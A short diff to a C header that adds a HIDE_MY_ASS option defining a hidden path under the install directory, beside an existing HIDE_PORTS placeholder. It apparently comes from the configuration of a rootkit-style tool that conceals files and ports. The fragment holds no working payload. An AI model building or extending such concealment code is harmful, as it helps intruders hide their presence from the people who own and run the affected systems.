@@ -20,6 +20,9 @@
 #ifdef HIDE_PORTS
 #define HIDEPORTS "??HIDEPORTS??" // [HIDE_PORTS]
 #endif
+#ifdef HIDE_MY_ASS
+#define ASS_PATH INSTALL_DIR"/my_ass" // [HIDE_MY_ASS]
+#endif
 
 //#define PATH_MAX 4096
 #define LINE_MAX 2048
